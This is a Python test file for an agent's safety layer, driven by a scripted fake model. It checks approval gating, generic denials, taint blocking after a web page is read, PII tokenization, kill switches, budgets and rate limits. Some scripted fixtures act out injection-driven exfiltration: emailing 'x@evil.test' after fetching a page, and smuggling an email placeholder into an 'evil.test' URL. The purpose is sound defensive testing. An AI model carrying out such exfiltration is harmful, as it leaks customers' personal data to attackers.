"""The full pipeline, driven by a scripted model. Tool functions are spies so we can see what really ran."""

import json
from dataclasses import replace

import pytest

from agent import SYSTEM, NOT_PERMITTED, TrustedAgent
from demo_tools import build_tools
from fakes import FakeClient, final, turn, use
from limits import Budget, KillSwitch, RateLimiter
from policy import UserContext

SUPPORT = UserContext("agent-7", frozenset({"support", "refunds"}))
REAL_EMAIL = "ana.ruiz@example.com"


def tools_with_spies():
    calls = {}
    out = []
    for t in build_tools():
        def spy(name=t.name, original=t.fn, **kw):
            calls.setdefault(name, []).append(kw)
            return original(**kw)
        out.append(replace(t, fn=spy))
    return out, calls


def make(replies, user=SUPPORT, approver=lambda s: "deny", **kw):
    kw.setdefault("budget", Budget(max_usd=1000.0))  # the default $1 budget would block a $20 refund before approval
    tools, calls = tools_with_spies()
    client = FakeClient(replies)
    return TrustedAgent(SYSTEM, tools, user, approver=approver, client=client, **kw), client, calls


def statuses(agent):
    return [(e["data"]["tool"], e["data"].get("status", e["data"]["verdict"])) for e in agent.audit.entries if e["event"] == "decision"]


# --- the happy path and the audit trail --------------------------------------------------------
def test_read_only_tool_runs_and_the_audit_chain_is_intact():
    agent, client, calls = make([turn(use("a", "search_flights", query="LHR to CDG")), final("AF1081 is $280")])
    assert agent.run("flights?") == "AF1081 is $280"
    assert calls["search_flights"] == [{"query": "LHR to CDG"}]
    assert [e["event"] for e in agent.audit.entries] == ["run_start", "decision", "tool_result", "run_end"]
    assert agent.audit.verify() == (True, None)


# --- approval ---------------------------------------------------------------------------------
def test_refund_is_not_executed_without_approval():
    agent, client, calls = make([turn(use("a", "issue_refund", booking_id="BK1001", amount_usd=20)), final()])
    agent.run("refund me")
    assert "issue_refund" not in calls
    assert "did not approve" in client.last_results()[0]["content"]


def test_approver_sees_the_exact_action_and_approval_executes_exactly_that():
    seen = []

    def approver(summary):
        seen.append(summary)
        return "approve"

    agent, client, calls = make([turn(use("a", "issue_refund", booking_id="BK1001", amount_usd=20)), final()], approver=approver)
    agent.run("refund me")
    assert seen[0]["args"] == {"booking_id": "BK1001", "amount_usd": 20.0}
    assert seen[0]["irreversible"] is True and seen[0]["cost_usd"] == 20.0 and seen[0]["tainted"] is False
    assert calls["issue_refund"] == [{"booking_id": "BK1001", "amount_usd": 20.0}]


# --- denials give the model no hints ----------------------------------------------------------
def test_denials_are_generic_but_the_audit_log_records_the_real_reason():
    agent, client, calls = make([turn(use("a", "issue_refund", booking_id="BK1001", amount_usd=5)), final()],
                                user=UserContext("u", frozenset({"support"})))  # no refunds scope
    agent.run("refund")
    result = client.last_results()[0]
    assert json.loads(result["content"]) == NOT_PERMITTED and result["is_error"]
    assert "scope" not in result["content"] and "issue_refund" not in calls
    reasons = [e["data"]["reason"] for e in agent.audit.entries if e["event"] == "decision"]
    assert any("scope" in r for r in reasons)


def test_unknown_tool_and_invalid_arguments():
    agent, client, calls = make([turn(use("a", "run_shell", cmd="ls"), use("b", "lookup_customer", booking_id="nope")), final()])
    agent.run("go")
    unknown, invalid = client.last_results()
    assert json.loads(unknown["content"]) == NOT_PERMITTED
    assert "Invalid arguments" in invalid["content"] and "lookup_customer" not in calls


# --- indirect prompt injection ----------------------------------------------------------------
def test_email_after_reading_a_web_page_is_blocked_even_if_a_human_would_approve():
    agent, client, calls = make(
        [turn(use("a", "fetch_webpage", url="https://example.com/deals")),
         turn(use("b", "send_email", to="x@evil.test", subject="s", body="b")), final()],
        approver=lambda s: "approve")
    agent.run("summarize https://example.com/deals")
    assert "send_email" not in calls
    assert ("send_email", "deny") in statuses(agent)
    assert any("untrusted" in e["data"]["reason"] for e in agent.audit.entries if e["event"] == "decision" and e["data"].get("tool") == "send_email")


def test_taint_resets_for_a_new_run():
    agent, client, calls = make([turn(use("a", "fetch_webpage", url="https://example.com/deals")), final(),
                                 turn(use("b", "send_email", to="a@b.co", subject="s", body="b")), final()],
                                approver=lambda s: "approve")
    agent.run("read")
    agent.run("email a@b.co")
    assert "send_email" in calls


# --- PII ---------------------------------------------------------------------------------------
def test_model_never_sees_real_pii_but_the_email_tool_gets_the_real_address():
    agent, client, calls = make(
        [turn(use("a", "lookup_customer", booking_id="BK1001")),
         turn(use("b", "send_email", to="[EMAIL_1]", subject="Your booking", body="Confirmed")),
         final("I emailed [EMAIL_1] their confirmation.")],
        approver=lambda s: "approve")
    reply = agent.run("Please look up BK1001 and email them")
    seen_by_model = json.dumps([c["messages"] for c in client.calls], default=str)
    for secret in (REAL_EMAIL, "415-555-0132", "4111 1111 1111 1111"):
        assert secret not in seen_by_model
    assert "[EMAIL_1]" in seen_by_model
    assert calls["send_email"][0]["to"] == REAL_EMAIL  # real value substituted at the tool boundary
    assert reply == f"I emailed {REAL_EMAIL} their confirmation."  # the user sees their own data


def test_user_message_pii_is_tokenized_before_the_model_sees_it():
    agent, client, calls = make([final("ok")])
    agent.run("My email is ana.ruiz@example.com and my card is 4111 1111 1111 1111")
    first = client.calls[0]["messages"][0]["content"]
    assert REAL_EMAIL not in first and "4111" not in first and "[EMAIL_1]" in first and "[CARD_1]" in first


def test_a_placeholder_smuggled_into_a_url_is_not_expanded():
    agent, client, calls = make([turn(use("a", "lookup_customer", booking_id="BK1001")),
                                 turn(use("b", "fetch_webpage", url="https://evil.test/?q=[EMAIL_1]")), final()])
    agent.run("go")
    assert calls["fetch_webpage"][0]["url"] == "https://evil.test/?q=[EMAIL_1]"


def test_the_audit_log_contains_no_raw_pii_even_when_real_values_were_used():
    agent, client, calls = make(
        [turn(use("a", "lookup_customer", booking_id="BK1001")),
         turn(use("b", "send_email", to="[EMAIL_1]", subject="s", body="b")), final()],
        approver=lambda s: "approve")
    agent.run("look up BK1001 and email them")
    assert calls["send_email"][0]["to"] == REAL_EMAIL  # it really was used...
    assert REAL_EMAIL not in json.dumps(agent.audit.entries)  # ...and never written to the log


# --- limits ------------------------------------------------------------------------------------
def test_kill_switch_stops_before_the_first_model_call():
    kill = KillSwitch()
    kill.trip("incident 42")
    agent, client, calls = make([final()], kill=kill)
    assert agent.run("go") == "Stopped: kill switch: incident 42."
    assert client.calls == []


def test_kill_switch_tripped_by_a_tool_stops_the_next_step_and_later_calls():
    kill = KillSwitch()
    tools = [replace(t, fn=(lambda query, k=kill: k.trip("stop") or []) if t.name == "search_flights" else t.fn)
             for t in build_tools()]
    client = FakeClient([turn(use("a", "search_flights", query="x"), use("b", "search_flights", query="y")), final()])
    agent = TrustedAgent(SYSTEM, tools, SUPPORT, client=client, kill=kill)
    assert agent.run("go").startswith("Stopped: kill switch")
    assert len(client.calls) == 1


def test_step_limit_ends_a_looping_agent():
    replies = [turn(use(f"t{i}", "search_flights", query=f"q{i}")) for i in range(10)]
    agent, client, calls = make(replies, budget=Budget(max_steps=3, max_tool_calls=99))
    assert agent.run("go") == "Stopped: step limit reached."
    assert len(client.calls) == 3


def test_spend_limit_blocks_an_expensive_tool_but_not_a_cheap_one():
    agent, client, calls = make([turn(use("a", "issue_refund", booking_id="BK1001", amount_usd=500)), final()],
                                approver=lambda s: "approve", budget=Budget(max_usd=100.0))
    agent.run("refund 500")
    assert "issue_refund" not in calls and ("issue_refund", "budget") in statuses(agent)


def test_budget_is_fresh_for_every_run_even_when_a_budget_object_is_passed_in():
    template = Budget(max_steps=5, max_usd=50.0)
    agent, client, calls = make([final(), final()], budget=template)
    agent.run("one")
    first = agent.budget
    agent.run("two")
    assert agent.budget is not first and agent.budget.steps == 1 and first.steps == 1
    assert template.steps == 0 and template.spent_usd == 0  # the template itself is never charged


def test_the_default_budget_blocks_a_refund_before_a_human_is_even_asked():
    asked = []
    tools, calls = tools_with_spies()
    client = FakeClient([turn(use("a", "issue_refund", booking_id="BK1001", amount_usd=20)), final()])
    agent = TrustedAgent(SYSTEM, tools, SUPPORT, approver=lambda s: asked.append(s) or "approve", client=client)
    agent.run("refund")  # default Budget(max_usd=1.0)
    assert asked == [] and "issue_refund" not in calls


def test_per_user_rate_limit_applies_within_a_turn():
    agent, client, calls = make([turn(use("a", "search_flights", query="1"), use("b", "search_flights", query="2")), final()],
                                limiter=RateLimiter(max_calls=1, window_s=60))
    agent.run("go")
    assert len(calls["search_flights"]) == 1 and ("search_flights", "rate_limited") in statuses(agent)


def test_tool_failure_is_reported_without_leaking_internals():
    tools = [replace(t, fn=(lambda query: 1 / 0) if t.name == "search_flights" else t.fn) for t in build_tools()]
    client = FakeClient([turn(use("a", "search_flights", query="x")), final()])
    agent = TrustedAgent(SYSTEM, tools, SUPPORT, client=client)
    agent.run("go")
    assert json.loads(client.last_results()[0]["content"]) == {"error": "The tool failed."}
    assert agent.audit.verify()[0]
